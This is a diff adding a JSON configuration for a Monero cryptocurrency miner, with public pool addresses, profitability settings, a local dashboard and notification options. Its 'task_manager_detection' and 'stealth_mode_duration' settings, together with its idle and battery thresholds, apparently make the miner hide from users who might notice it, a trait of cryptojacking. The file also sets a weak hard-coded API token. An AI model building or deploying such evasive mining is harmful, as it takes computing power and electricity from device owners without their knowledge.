@@ -1,0 +1,81 @@
+{
+  "mining": {
+    "algorithm": "rx/0",
+    "pool_url": "stratum+tcp://pool.supportxmr.com:3333",
+    "wallet": "",
+    "worker_name": "advanced-miner",
+    "cpu_threads": "auto",
+    "gpu_enabled": false,
+    "algorithms": ["rx/0", "kawpow", "ethash"],
+    "pools": [
+      {
+        "name": "SupportXMR",
+        "url": "stratum+tcp://pool.supportxmr.com:3333",
+        "backup_url": "stratum+tcp://pool.supportxmr.com:7777"
+      },
+      {
+        "name": "MoneroOcean",
+        "url": "stratum+tcp://gulf.moneroocean.stream:10032",
+        "backup_url": "stratum+tcp://gulf.moneroocean.stream:10033"
+      }
+    ]
+  },
+  "resource_management": {
+    "charging_threshold": 90,
+    "idle_threshold": 300,
+    "battery_threshold": 25,
+    "task_manager_detection": true,
+    "stealth_mode_duration": 30,
+    "temperature_threshold": 85,
+    "memory_threshold": 90,
+    "disk_threshold": 95
+  },
+  "profitability": {
+    "electricity_cost": 0.12,
+    "power_consumption": 200,
+    "currency": "USD",
+    "price_update_interval": 300,
+    "profitability_calculation_interval": 60
+  },
+  "monitoring": {
+    "dashboard_port": 8080,
+    "api_port": 18067,
+    "log_level": "INFO",
+    "log_rotation": true,
+    "max_log_size": "10MB",
+    "backup_count": 5
+  },
+  "security": {
+    "api_access_token": "advanced-miner-token",
+    "enable_ssl": false,
+    "allowed_ips": ["127.0.0.1", "::1"],
+    "max_connections": 10
+  },
+  "notifications": {
+    "enabled": false,
+    "email": {
+      "smtp_server": "",
+      "smtp_port": 587,
+      "username": "",
+      "password": "",
+      "recipient": ""
+    },
+    "discord": {
+      "webhook_url": "",
+      "bot_name": "Advanced Miner"
+    },
+    "telegram": {
+      "bot_token": "",
+      "chat_id": ""
+    }
+  },
+  "advanced": {
+    "auto_restart": true,
+    "restart_on_failure": true,
+    "max_restart_attempts": 3,
+    "restart_delay": 30,
+    "performance_mode": "balanced",
+    "debug_mode": false,
+    "data_retention_days": 30
+  }
+}
